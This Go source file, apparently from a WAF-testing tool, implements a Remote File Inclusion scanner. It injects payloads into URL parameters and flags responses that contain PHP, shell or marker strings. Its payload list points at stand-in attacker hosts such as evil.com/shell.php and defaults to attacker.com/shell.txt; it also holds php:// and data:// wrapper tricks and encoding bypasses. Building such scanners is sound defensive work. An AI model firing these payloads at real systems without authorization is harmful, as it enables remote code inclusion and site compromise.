// Package rfi provides Remote File Inclusion testing
package rfi

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures RFI testing
type Config struct {
	attackconfig.Base
	Headers     map[string]string
	CallbackURL string // OOB callback URL
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.Base{
			Concurrency: defaults.ConcurrencyMedium,
			Timeout:     httpclient.TimeoutScanning,
		},
	}
}

// Result represents an RFI test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs RFI testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new RFI scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = defaults.ConcurrencyMedium
	}
	if config.Timeout <= 0 {
		config.Timeout = httpclient.TimeoutScanning
	}

	return &Scanner{
		config:  config,
		client:  httpclient.Default(),
		results: make([]Result, 0),
	}
}

// Scan tests a URL for RFI vulnerabilities
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads(s.config.CallbackURL) {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload.Value

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents an RFI payload
type Payload struct {
	Value   string
	Type    string
	Markers []string
}

// testPayload tests a single RFI payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param string, payload Payload, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload.Value,
		Timestamp: time.Now(),
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	q := u.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload.Markers)
	if result.Vulnerable {
		result.Severity = "CRITICAL"
	}

	return result
}

// detectVulnerability checks response for RFI indicators
func (s *Scanner) detectVulnerability(body string, markers []string) (bool, string) {
	for _, marker := range markers {
		if strings.Contains(body, marker) {
			return true, "RFI marker found: " + marker
		}
	}

	// Check for remote inclusion indicators
	patterns := []string{
		"<?php",
		"#!/bin",
		"<script>",
		"RFI_TEST_MARKER",
	}

	for _, pattern := range patterns {
		if strings.Contains(body, pattern) {
			return true, "Remote content detected: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns RFI test payloads
func Payloads(callbackURL string) []Payload {
	if callbackURL == "" {
		callbackURL = "http://attacker.com/shell.txt"
	}

	return []Payload{
		// Basic HTTP includes
		{Value: callbackURL, Type: "http", Markers: []string{"RFI_TEST"}},
		{Value: "http://evil.com/shell.txt", Type: "http", Markers: []string{"<?php"}},
		{Value: "https://evil.com/shell.php", Type: "https", Markers: []string{"<?php"}},

		// Null byte bypass
		{Value: callbackURL + "%00", Type: "null-byte", Markers: []string{}},
		{Value: callbackURL + "\x00", Type: "null-byte", Markers: []string{}},

		// Data wrapper
		{Value: "data://text/plain,<?php phpinfo(); ?>", Type: "data", Markers: []string{"phpinfo"}},
		{Value: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", Type: "data-base64", Markers: []string{"phpinfo"}},

		// PHP wrappers
		{Value: "php://input", Type: "php-input", Markers: []string{}},
		{Value: "php://filter/convert.base64-encode/resource=" + callbackURL, Type: "php-filter", Markers: []string{}},

		// FTP
		{Value: "ftp://evil.com/shell.txt", Type: "ftp", Markers: []string{"<?php"}},

		// SMB (Windows)
		{Value: "\\\\evil.com\\share\\shell.txt", Type: "smb", Markers: []string{}},
		{Value: "//evil.com/share/shell.txt", Type: "smb", Markers: []string{}},

		// Encoded payloads
		{Value: "http%3A%2F%2Fevil.com%2Fshell.txt", Type: "encoded", Markers: []string{}},
		{Value: "http:%2f%2fevil.com%2fshell.txt", Type: "double-encoded", Markers: []string{}},
	}
}
